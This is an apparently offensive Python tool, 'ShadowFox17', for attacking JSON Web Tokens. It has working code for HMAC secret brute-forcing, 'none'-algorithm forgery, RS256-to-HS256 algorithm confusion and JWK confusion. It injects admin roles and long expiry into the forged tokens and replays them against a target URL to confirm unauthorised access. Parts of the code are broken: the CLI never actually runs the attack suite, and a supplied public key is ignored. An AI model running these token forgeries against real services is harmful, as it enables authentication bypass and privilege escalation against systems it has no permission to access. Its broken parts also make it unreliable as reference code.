#!/usr/bin/env python3
"""
ShadowFox17 - JWT Attack & Signature Forging Module
AI-assisted JWT vulnerability scanner with algorithm confusion and forging capabilities
"""

import base64
import json
import hmac
import hashlib
import time
import re
import requests
import argparse
import logging
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from datetime import datetime, timedelta
from pathlib import Path
import secrets
import threading
from urllib.parse import urlparse

try:
    import jwt
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.exceptions import InvalidSignature
except ImportError:
    print("Installing required libraries...")
    import subprocess
    subprocess.check_call(["pip", "install", "PyJWT", "cryptography", "requests"])
    import jwt
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.exceptions import InvalidSignature

@dataclass
class JWTInfo:
    """JWT token informacije"""
    raw_token: str
    header: Dict
    payload: Dict
    signature: str
    algorithm: str
    is_valid: bool
    expiry: Optional[datetime] = None
    issuer: Optional[str] = None
    subject: Optional[str] = None
    audience: Optional[str] = None

@dataclass
class AttackResult:
    """Rezultat JWT napada"""
    attack_type: str
    success: bool
    forged_token: Optional[str]
    original_token: str
    payload_modified: Dict
    algorithm_used: str
    timestamp: float
    error_message: Optional[str] = None
    validation_response: Optional[Dict] = None

class JWTForgeAI:
    """
    AI-powered JWT Attack Module
    Automatski detektuje i napada JWT tokene
    """
    
    def __init__(self, mission_id: str = None, output_dir: str = "jwt_attacks"):
        self.mission_id = mission_id or f"jwt_mission_{int(time.time())}"
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Attack results storage
        self.attack_results: List[AttackResult] = []
        self.discovered_keys: List[str] = []
        self.vulnerable_endpoints: List[str] = []
        
        # AI learning data
        self.success_patterns: Dict[str, int] = {}
        self.failure_patterns: Dict[str, int] = {}
        
        # Common weak secrets for bruteforce
        self.common_secrets = [
            "secret", "key", "password", "jwt", "token", "auth",
            "123456", "admin", "user", "test", "dev", "debug",
            "", "null", "undefined", "your-256-bit-secret",
            "your-secret-key", "my-secret", "supersecret"
        ]
        
        # RSA key pairs for algorithm confusion
        self.rsa_keys = self._generate_rsa_keypair()
        
        # Setup logging
        self._setup_logging()
        
    def _setup_logging(self):
        """Podešava logging sistem"""
        log_file = self.output_dir / f"jwt_attacks_{self.mission_id}.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - JWT_FORGE - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger("JWTForgeAI")
        
    def _generate_rsa_keypair(self) -> Tuple[Any, Any]:
        """Generiše RSA key pair za algorithm confusion"""
        try:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048
            )
            public_key = private_key.public_key()
            return private_key, public_key
        except Exception as e:
            self.logger.error(f"Failed to generate RSA keys: {e}")
            return None, None
    
    def decode_jwt_safe(self, token: str, verify: bool = False) -> Optional[JWTInfo]:
        """Sigurno dekodira JWT token bez validacije"""
        try:
            # Razdeli token na delove
            parts = token.split('.')
            if len(parts) != 3:
                self.logger.error("Invalid JWT format - not 3 parts")
                return None
            
            # Dekodira header
            try:
                header_data = base64.urlsafe_b64decode(parts[0] + '==')
                header = json.loads(header_data.decode('utf-8'))
            except Exception as e:
                self.logger.error(f"Failed to decode header: {e}")
                return None
            
            # Dekodira payload
            try:
                payload_data = base64.urlsafe_b64decode(parts[1] + '==')
                payload = json.loads(payload_data.decode('utf-8'))
            except Exception as e:
                self.logger.error(f"Failed to decode payload: {e}")
                return None
            
            signature = parts[2]
            algorithm = header.get('alg', 'unknown')
            
            # Izvuci važne podatke
            expiry = None
            if 'exp' in payload:
                try:
                    expiry = datetime.fromtimestamp(payload['exp'])
                except:
                    pass
            
            jwt_info = JWTInfo(
                raw_token=token,
                header=header,
                payload=payload,
                signature=signature,
                algorithm=algorithm,
                is_valid=False,  # Ne validiramo ovde
                expiry=expiry,
                issuer=payload.get('iss'),
                subject=payload.get('sub'),
                audience=payload.get('aud')
            )
            
            self.logger.info(f"Decoded JWT: alg={algorithm}, sub={jwt_info.subject}, exp={expiry}")
            return jwt_info
            
        except Exception as e:
            self.logger.error(f"JWT decode error: {e}")
            return None
    
    def analyze_jwt_security(self, jwt_info: JWTInfo) -> Dict[str, Any]:
        """AI analiza bezbednosti JWT tokena"""
        security_analysis = {
            'risk_score': 0,
            'vulnerabilities': [],
            'recommendations': [],
            'attack_vectors': []
        }
        
        # Analiza algoritma
        if jwt_info.algorithm.lower() == 'none':
            security_analysis['risk_score'] += 10
            security_analysis['vulnerabilities'].append("None algorithm - no signature verification")
            security_analysis['attack_vectors'].append("none_algorithm")
            
        elif jwt_info.algorithm.startswith('HS'):
            security_analysis['risk_score'] += 3
            security_analysis['vulnerabilities'].append("HMAC algorithm - vulnerable to secret bruteforce")
            security_analysis['attack_vectors'].extend(["hmac_bruteforce", "algorithm_confusion"])
            
        elif jwt_info.algorithm.startswith('RS'):
            security_analysis['attack_vectors'].append("algorithm_confusion")
            
        # Analiza payload-a
        payload = jwt_info.payload
        
        # Proveri expiry
        if not payload.get('exp'):
            security_analysis['risk_score'] += 5
            security_analysis['vulnerabilities'].append("No expiration time set")
        elif jwt_info.expiry and jwt_info.expiry < datetime.now():
            security_analysis['vulnerabilities'].append("Token expired")
        elif jwt_info.expiry and (jwt_info.expiry - datetime.now()).days > 365:
            security_analysis['risk_score'] += 3
            security_analysis['vulnerabilities'].append("Token expiry too long (>1 year)")
            
        # Proveri admin/privileged claims
        sensitive_claims = ['admin', 'role', 'scope', 'permissions', 'is_admin', 'user_type']
        for claim in sensitive_claims:
            if claim in payload:
                security_analysis['risk_score'] += 2
                security_analysis['attack_vectors'].append("privilege_escalation")
                break
        
        # Weak secret indicators
        if len(jwt_info.signature) < 20:  # Kratka signatura = weak secret?
            security_analysis['risk_score'] += 4
            security_analysis['vulnerabilities'].append("Potentially weak secret (short signature)")
            
        return security_analysis
    
    def attempt_none_algorithm(self, jwt_info: JWTInfo, payload_modifications: Dict = None) -> AttackResult:
        """Pokušava None algorithm napad"""
        self.logger.info("Attempting None algorithm attack...")
        
        try:
            # Modifikuj header da koristi 'none'
            new_header = jwt_info.header.copy()
            new_header['alg'] = 'none'
            
            # Modifikuj payload ako je potrebno
            new_payload = jwt_info.payload.copy()
            if payload_modifications:
                new_payload.update(payload_modifications)
                
            # Extend expiry if present
            if 'exp' in new_payload:
                new_payload['exp'] = int((datetime.now() + timedelta(days=365)).timestamp())
            
            # Kreiraj novi token bez signature
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(new_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(new_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # None algorithm = empty signature
            forged_token = f"{header_encoded}.{payload_encoded}."
            
            result = AttackResult(
                attack_type="none_algorithm",
                success=True,
                forged_token=forged_token,
                original_token=jwt_info.raw_token,
                payload_modified=payload_modifications or {},
                algorithm_used="none",
                timestamp=time.time()
            )
            
            self.attack_results.append(result)
            self.logger.info("✅ None algorithm attack successful!")
            return result
            
        except Exception as e:
            result = AttackResult(
                attack_type="none_algorithm",
                success=False,
                forged_token=None,
                original_token=jwt_info.raw_token,
                payload_modified=payload_modifications or {},
                algorithm_used="none",
                timestamp=time.time(),
                error_message=str(e)
            )
            self.attack_results.append(result)
            self.logger.error(f"❌ None algorithm attack failed: {e}")
            return result
    
    def attempt_hmac_bruteforce(self, jwt_info: JWTInfo, custom_wordlist: List[str] = None) -> AttackResult:
        """Bruteforce HMAC secret"""
        self.logger.info("Attempting HMAC secret bruteforce...")
        
        wordlist = custom_wordlist or self.common_secrets
        
        try:
            for secret in wordlist:
                try:
                    # Pokušaj da validiraš token sa ovim secret-om
                    decoded = jwt.decode(
                        jwt_info.raw_token, 
                        secret, 
                        algorithms=[jwt_info.algorithm],
                        options={"verify_exp": False}
                    )
                    
                    # Uspešna validacija = našli smo secret!
                    self.discovered_keys.append(secret)
                    self.logger.info(f"🔑 Found HMAC secret: '{secret}'")
                    
                    # Kreiraj forged token sa novim payload-om
                    new_payload = jwt_info.payload.copy()
                    new_payload['exp'] = int((datetime.now() + timedelta(days=365)).timestamp())
                    
                    # Dodaj admin privilegije ako postoji role/admin field
                    if 'role' in new_payload:
                        new_payload['role'] = 'admin'
                    elif 'admin' in new_payload:
                        new_payload['admin'] = True
                    elif 'is_admin' in new_payload:
                        new_payload['is_admin'] = True
                    else:
                        new_payload['role'] = 'admin'  # Dodaj admin role
                    
                    forged_token = jwt.encode(new_payload, secret, algorithm=jwt_info.algorithm)
                    
                    result = AttackResult(
                        attack_type="hmac_bruteforce",
                        success=True,
                        forged_token=forged_token,
                        original_token=jwt_info.raw_token,
                        payload_modified={'secret_found': secret, 'role': 'admin'},
                        algorithm_used=jwt_info.algorithm,
                        timestamp=time.time()
                    )
                    
                    self.attack_results.append(result)
                    return result
                    
                except jwt.InvalidSignatureError:
                    continue
                except Exception as e:
                    self.logger.debug(f"Secret '{secret}' failed: {e}")
                    continue
            
            # Nijedan secret nije radio
            result = AttackResult(
                attack_type="hmac_bruteforce",
                success=False,
                forged_token=None,
                original_token=jwt_info.raw_token,
                payload_modified={},
                algorithm_used=jwt_info.algorithm,
                timestamp=time.time(),
                error_message="No valid secret found in wordlist"
            )
            
            self.attack_results.append(result)
            self.logger.warning("❌ HMAC bruteforce failed - no valid secret found")
            return result
            
        except Exception as e:
            result = AttackResult(
                attack_type="hmac_bruteforce",
                success=False,
                forged_token=None,
                original_token=jwt_info.raw_token,
                payload_modified={},
                algorithm_used=jwt_info.algorithm,
                timestamp=time.time(),
                error_message=str(e)
            )
            self.attack_results.append(result)
            self.logger.error(f"❌ HMAC bruteforce error: {e}")
            return result
    
    def attempt_algorithm_confusion(self, jwt_info: JWTInfo, public_key_pem: str = None) -> AttackResult:
        """RS256 → HS256 Algorithm Confusion napad"""
        self.logger.info("Attempting Algorithm Confusion attack (RS256 → HS256)...")
        
        try:
            if not jwt_info.algorithm.startswith('RS'):
                raise ValueError("Algorithm confusion only works on RSA algorithms")
            
            # Koristi dati public key ili generiši novi
            if public_key_pem:
                public_key_data = public_key_pem.encode()
            else:
                # Pokušaj da izvučeš public key iz tokena (ovo je retko moguće)
                # Za demo, koristićemo naš generirani ključ
                if self.rsa_keys[1]:
                    public_key_data = self.rsa_keys[1].public_key_pem = self.rsa_keys[1].public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PublicFormat.SubjectPublicKeyInfo
                    )
                else:
                    raise ValueError("No RSA public key available")
            
            # Modifikuj header da koristi HS256
            new_header = jwt_info.header.copy()
            new_header['alg'] = 'HS256'
            
            # Modifikuj payload
            new_payload = jwt_info.payload.copy()
            new_payload['exp'] = int((datetime.now() + timedelta(days=365)).timestamp())
            
            # Dodaj admin privilegije
            if 'role' in new_payload:
                new_payload['role'] = 'admin'
            elif 'admin' in new_payload:
                new_payload['admin'] = True
            else:
                new_payload['role'] = 'admin'
            
            # Kreiraj token koristeći public key kao HMAC secret
            forged_token = jwt.encode(new_payload, public_key_data, algorithm='HS256')
            
            result = AttackResult(
                attack_type="algorithm_confusion",
                success=True,
                forged_token=forged_token,
                original_token=jwt_info.raw_token,
                payload_modified={'algorithm_changed': 'RS256→HS256', 'role': 'admin'},
                algorithm_used="HS256",
                timestamp=time.time()
            )
            
            self.attack_results.append(result)
            self.logger.info("✅ Algorithm confusion attack successful!")
            return result
            
        except Exception as e:
            result = AttackResult(
                attack_type="algorithm_confusion",
                success=False,
                forged_token=None,
                original_token=jwt_info.raw_token,
                payload_modified={},
                algorithm_used=jwt_info.algorithm,
                timestamp=time.time(),
                error_message=str(e)
            )
            self.attack_results.append(result)
            self.logger.error(f"❌ Algorithm confusion attack failed: {e}")
            return result
    
    def attempt_key_confusion(self, jwt_info: JWTInfo) -> List[AttackResult]:
        """Pokušava različite key confusion napade"""
        results = []
        
        # JWK confusion - koristi header kao secret
        if 'jwk' in jwt_info.header:
            self.logger.info("Attempting JWK confusion attack...")
            try:
                jwk_data = json.dumps(jwt_info.header['jwk'])
                new_payload = jwt_info.payload.copy()
                new_payload['role'] = 'admin'
                
                forged_token = jwt.encode(new_payload, jwk_data, algorithm='HS256')
                
                result = AttackResult(
                    attack_type="jwk_confusion",
                    success=True,
                    forged_token=forged_token,
                    original_token=jwt_info.raw_token,
                    payload_modified={'role': 'admin'},
                    algorithm_used="HS256",
                    timestamp=time.time()
                )
                results.append(result)
                
            except Exception as e:
                self.logger.error(f"JWK confusion failed: {e}")
        
        # Kid header injection
        if 'kid' in jwt_info.header:
            self.logger.info("Attempting Kid header injection...")
            # Ovo je kompleksnije i zahteva poznavanje backend implementacije
            pass
        
        return results
    
    def validate_token_on_target(self, token: str, target_url: str, 
                               headers: Dict = None, method: str = "GET") -> Dict:
        """Validira forged token na target aplikaciji"""
        try:
            test_headers = {'Authorization': f'Bearer {token}'}
            if headers:
                test_headers.update(headers)
            
            if method.upper() == "GET":
                response = requests.get(target_url, headers=test_headers, timeout=10)
            else:
                response = requests.post(target_url, headers=test_headers, timeout=10)
            
            return {
                'status_code': response.status_code,
                'success': response.status_code < 400,
                'response_length': len(response.text),
                'response_headers': dict(response.headers),
                'response_preview': response.text[:500]
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def run_full_attack_suite(self, jwt_token: str, target_url: str = None, 
                            custom_payloads: Dict = None) -> Dict[str, Any]:
        """Pokreće kompletnu JWT attack suite"""
        self.logger.info(f"🚀 Starting full JWT attack suite for mission: {self.mission_id}")
        
        # Dekodiranje tokena
        jwt_info = self.decode_jwt_safe(jwt_token)
        if not jwt_info:
            return {'success': False, 'error': 'Failed to decode JWT token'}
        
        # AI analiza
        security_analysis = self.analyze_jwt_security(jwt_info)
        self.logger.info(f"🧠 AI Risk Score: {security_analysis['risk_score']}/10")
        
        attack_results = []
        
        # 1. None Algorithm Attack
        if 'none_algorithm' in security_analysis['attack_vectors']:
            result = self.attempt_none_algorithm(jwt_info, custom_payloads)
            attack_results.append(result)
            
            # Testiraj na target-u ako je dat
            if target_url and result.success:
                validation = self.validate_token_on_target(result.forged_token, target_url)
                result.validation_response = validation
                if validation.get('success'):
                    self.vulnerable_endpoints.append(target_url)
        
        # 2. HMAC Bruteforce Attack
        if 'hmac_bruteforce' in security_analysis['attack_vectors']:
            result = self.attempt_hmac_bruteforce(jwt_info)
            attack_results.append(result)
            
            if target_url and result.success:
                validation = self.validate_token_on_target(result.forged_token, target_url)
                result.validation_response = validation
                if validation.get('success'):
                    self.vulnerable_endpoints.append(target_url)
        
        # 3. Algorithm Confusion Attack
        if 'algorithm_confusion' in security_analysis['attack_vectors']:
            result = self.attempt_algorithm_confusion(jwt_info)
            attack_results.append(result)
            
            if target_url and result.success:
                validation = self.validate_token_on_target(result.forged_token, target_url)
                result.validation_response = validation
                if validation.get('success'):
                    self.vulnerable_endpoints.append(target_url)
        
        # 4. Key Confusion Attacks
        key_confusion_results = self.attempt_key_confusion(jwt_info)
        attack_results.extend(key_confusion_results)
        
        # 5. Privilege Escalation pokušaji
        if 'privilege_escalation' in security_analysis['attack_vectors']:
            # Pokušaj različite privilege escalation payloads
            privilege_payloads = [
                {'role': 'admin'},
                {'admin': True},
                {'is_admin': True},
                {'user_type': 'admin'},
                {'scope': 'admin'},
                {'permissions': ['admin', 'read', 'write', 'delete']}
            ]
            
            for payload_mod in privilege_payloads:
                if jwt_info.algorithm == 'none' or len(self.discovered_keys) > 0:
                    # Koristi poznati secret ili none algorithm
                    secret = self.discovered_keys[0] if self.discovered_keys else None
                    
                    try:
                        new_payload = jwt_info.payload.copy()
                        new_payload.update(payload_mod)
                        new_payload['exp'] = int((datetime.now() + timedelta(days=365)).timestamp())
                        
                        if secret:
                            forged_token = jwt.encode(new_payload, secret, algorithm=jwt_info.algorithm)
                        else:
                            # None algorithm
                            header_encoded = base64.urlsafe_b64encode(
                                json.dumps({'alg': 'none', 'typ': 'JWT'}).encode()
                            ).decode().rstrip('=')
                            payload_encoded = base64.urlsafe_b64encode(
                                json.dumps(new_payload).encode()
                            ).decode().rstrip('=')
                            forged_token = f"{header_encoded}.{payload_encoded}."
                        
                        result = AttackResult(
                            attack_type="privilege_escalation",
                            success=True,
                            forged_token=forged_token,
                            original_token=jwt_token,
                            payload_modified=payload_mod,
                            algorithm_used=jwt_info.algorithm if secret else 'none',
                            timestamp=time.time()
                        )
                        
                        # Test na target-u
                        if target_url:
                            validation = self.validate_token_on_target(forged_token, target_url)
                            result.validation_response = validation
                            if validation.get('success'):
                                self.vulnerable_endpoints.append(target_url)
                        
                        attack_results.append(result)
                        
                    except Exception as e:
                        self.logger.error(f"Privilege escalation failed for {payload_mod}: {e}")
        
        # Sačuvaj rezultate
        self._save_attack_results()
        
        # AI Learning - sačuvaj patterns
        self._update_ai_learning(security_analysis, attack_results)
        
        successful_attacks = [r for r in attack_results if r.success]
        
        return {
            'success': len(successful_attacks) > 0,
            'jwt_info': asdict(jwt_info),
            'security_analysis': security_analysis,
            'attack_results': [asdict(r) for r in attack_results],
            'successful_attacks': len(successful_attacks),
            'total_attacks': len(attack_results),
            'vulnerable_endpoints': self.vulnerable_endpoints,
            'discovered_secrets': self.discovered_keys
        }
    
    def _update_ai_learning(self, security_analysis: Dict, attack_results: List[AttackResult]):
        """Ažurira AI learning na osnovu rezultata"""
        for result in attack_results:
            pattern_key = f"{result.attack_type}_{result.algorithm_used}"
            
            if result.success:
                self.success_patterns[pattern_key] = self.success_patterns.get(pattern_key, 0) + 1
            else:
                self.failure_patterns[pattern_key] = self.failure_patterns.get(pattern_key, 0) + 1
    
    def _save_attack_results(self):
        """Čuva rezultate napada u fajl"""
        results_file = self.output_dir / f"jwt_attack_results_{self.mission_id}.json"
        
        data = {
            'mission_id': self.mission_id,
            'timestamp': time.time(),
            'attack_results': [asdict(r) for r in self.attack_results],
            'discovered_keys': self.discovered_keys,
            'vulnerable_endpoints': self.vulnerable_endpoints,
            'ai_learning': {
                'success_patterns': self.success_patterns,
                'failure_patterns': self.failure_patterns
            }
        }
        
        with open(results_file, 'w') as f:
            json.dump(data, f, indent=2, default=str)
        
        self.logger.info(f"💾 Attack results saved to: {results_file}")
    
    def generate_report(self) -> str:
        """Generiše detaljni izveštaj napada"""
        if not self.attack_results:
            return "No attack results available."
        
        successful = [r for r in self.attack_results if r.success]
        
        report = f"""
🛡️  ShadowFox JWT Attack Report
Mission ID: {self.mission_id}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 SUMMARY:
- Total Attacks: {len(self.attack_results)}
- Successful: {len(successful)}
- Success Rate: {len(successful)/len(self.attack_results)*100:.1f}%

🔑 DISCOVERED SECRETS:
{chr(10).join(f"- '{secret}'" for secret in self.discovered_keys) if self.discovered_keys else "- None found"}

🎯 VULNERABLE ENDPOINTS:
{chr(10).join(f"- {endpoint}" for endpoint in set(self.vulnerable_endpoints)) if self.vulnerable_endpoints else "- none tested"}

✅ SUCCESSFUL ATTACKS:
"""
        
        for result in successful:
            report += f"""
Attack Type: {result.attack_type.upper()}
Algorithm: {result.algorithm_used}
Forged Token: {result.forged_token[:50]}...
Payload Modified: {result.payload_modified}
{f"Validation: {'✅ Success' if result.validation_response and result.validation_response.get('success') else '❌ Failed'}" if result.validation_response else ""}
---
"""
        
        return report
def run_jwt_attack(data):
    print("[JWT] Pokrećem JWT napad sa:", data)
    return {"jwt_result": "demo_token_attack"}

def main():
    """CLI interface za JWT napad"""
    parser = argparse.ArgumentParser(description='ShadowFox JWT Attack & Forging Tool')
    parser.add_argument('token', help='JWT token to analyze and attack')
    parser.add_argument('-t', '--target', help='Target URL to test forged tokens')
    parser.add_argument('-o', '--output', default='jwt_attacks', help='Output directory')
    parser.add_argument('-m', '--mission-id', help='Mission ID for tracking')
    parser.add_argument('-w', '--wordlist', help='Custom wordlist file for bruteforce')
    parser.add_argument('--payload', help='JSON payload modifications', type=json.loads)
    parser.add_argument('--public-key', help='RSA public key file for algorithm confusion')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Učitaj custom wordlist ako je dat
    custom_wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist, 'r') as f:
                custom_wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"Error loading wordlist: {e}")
    
    # Učitaj public key ako je dat
    public_key_pem = None
    if args.public_key:
        try:
            with open(args.public_key, 'r') as f:
                public_key_pem = f.read()
        except Exception as e:
            print(f"Error loading public key: {e}")
    
    # Pokreni napad
    jwt_forge = JWTForgeAI(mission_id=args.mission_id, output_dir=args.output)
    
    # Dodaj custom wordlist
    if custom_wordlist:
        jwt_forge.common_secrets.extend(custom_wordlist)
    
    print(f"🚀 Starting JWT attack on token: {args.token[:50]}...")
    
    try:
        results = jwt_forge
    except Exception as e:
        print("Greška pri JWT napadu:", e)
        results = None
